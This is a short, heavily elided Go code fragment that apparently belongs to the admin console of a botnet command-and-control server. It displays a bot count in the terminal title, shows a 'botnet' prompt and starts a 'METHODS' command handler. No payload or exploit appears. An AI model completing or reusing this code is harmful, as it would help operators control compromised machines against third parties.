...
func (this *Admin) Handle() {
	...
	go func() {
		...
		for {
			...
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Bots: %d\007", BotCount))); err != nil {
				this.conn.Close()
				break
			}
			i++
	...
	for {
		...
		var botCount int
        this.conn.Write([]byte("\x1b[1;36m[" + username + "\x1b[1;37m@\x1b[1;36mbotnet\x1b[1;37m]\033[0m "))
		...
		if cmd == "METHODS" || cmd == "methods"  || cmd == "?" { 
			this.conn.Write([]byte("\r\n"))
